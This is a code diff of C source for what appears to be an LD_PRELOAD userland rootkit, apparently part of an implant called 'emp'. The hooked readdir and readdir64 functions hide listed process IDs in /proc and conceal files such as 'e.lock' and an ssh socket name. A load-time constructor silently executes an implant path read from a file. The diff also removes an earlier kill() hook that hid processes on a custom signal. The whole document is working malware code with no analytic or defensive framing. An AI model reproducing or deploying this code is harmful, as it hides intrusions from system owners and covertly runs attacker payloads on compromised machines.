@@ -19,18 +19,32 @@ void trim_str(char* buffer)
     buffer[strcspn(buffer, "\r\n")] = 0;
 }
 
+int is_file_exist(const char* path)
+{
+    if (access(path, F_OK) != -1) {
+        return 1;
+    }
+    return 0;
+}
+
 // check if this pid is present in /dev/shm/emp PID list
 int is_hidden(const char* pid)
 {
+    if (!is_file_exist(SHM_FILE)) {
+        return 0;
+    }
+
     FILE* fd = fopen(SHM_FILE, "r");
     int bufferLength = 255;
     char buffer[bufferLength];
     while (fgets(buffer, bufferLength, fd)) {
         trim_str(buffer);
         if (strncmp(pid, buffer, strlen(pid)) == 0) {
+            fclose(fd);
             return 1;
         }
     }
+    fclose(fd);
     return 0;
 }
 
@@ -81,6 +95,8 @@ struct dirent64* readdir64(DIR* dirp)
             closedir(proc_1);
             return NULL;
         }
+
+        // processes
         if (strcmp(pwd, "/proc") == 0) {
             if (is_hidden(result->d_name)) {
                 printf("HIT pid %s", result->d_name);
@@ -88,7 +104,10 @@ struct dirent64* readdir64(DIR* dirp)
                 return temp;
             }
         }
-        if (strstr(result->d_name, HIDE_ME)) {
+
+        // other directories
+        if (strstr(result->d_name, HIDE_ME) || strcmp(result->d_name, "e.lock") == 0
+            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0) {
             closedir(proc_1);
             return temp;
         }
@@ -115,14 +134,19 @@ struct dirent* readdir(DIR* dirp)
             closedir(proc_1);
             return NULL;
         }
+
+        // processes
         if (strcmp(pwd, "/proc") == 0) {
             if (is_hidden(result->d_name)) {
-                printf("HIT pid %s\n", result->d_name);
+                printf("HIT pid %s", result->d_name);
                 closedir(proc_1);
                 return temp;
             }
         }
-        if (strstr(result->d_name, HIDE_ME)) {
+
+        // other directories
+        if (strstr(result->d_name, HIDE_ME) || strcmp(result->d_name, "e.lock") == 0
+            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0) {
             closedir(proc_1);
             return temp;
         }
@@ -132,49 +156,26 @@ struct dirent* readdir(DIR* dirp)
     return result;
 }
 
-void add_hide_pid(char* pid)
+void run_emp(const char* path)
 {
-    fwrite(pid, 1, sizeof(pid), SHM_FD);
-}
-
-FILE* open_ramfs(void)
-{
-    FILE* fd;
-    fd = fopen64(SHM_FILE, "a+");
-    return fd;
-}
-
-int kill(pid_t pid, int sig)
-{
-    static int (*orig_kill)(pid_t pid, int sig) = NULL;
-    if (!orig_kill)
-        orig_kill = dlsym(RTLD_NEXT, "kill");
-
-    char pid_s[256];
-    if (!snprintf(pid_s, sizeof(pid_s), "%d", pid)) {
-        return orig_kill(pid, sig);
+    if (!execlp("sh", "-c", path, (char*)0)) {
+        return;
     }
-
-    switch (sig) {
-    case SIGINVIS:
-        add_hide_pid(pid_s);
-        break;
-    default:
-        return orig_kill(pid, sig);
-    }
-
-    return 0;
 }
 
 void __attribute__((constructor)) initLibrary(void)
 {
-    if (!SHM_FD)
-        SHM_FD = open_ramfs();
-
-    execlp("sh", "-c", EmpPATH, (char*)0);
+    // get EmpPATH
+    if (is_file_exist(EMP_FILE)) {
+        FILE* fd = fopen(EMP_FILE, "r");
+        char buf[255];
+        fgets(buf, 255, fd);
+        trim_str(buf);
+        if (is_file_exist(buf))
+            run_emp(buf);
+    }
 }
 
 void __attribute__((destructor)) cleanUpLibrary(void)
 {
-    fclose(SHM_FD);
 }
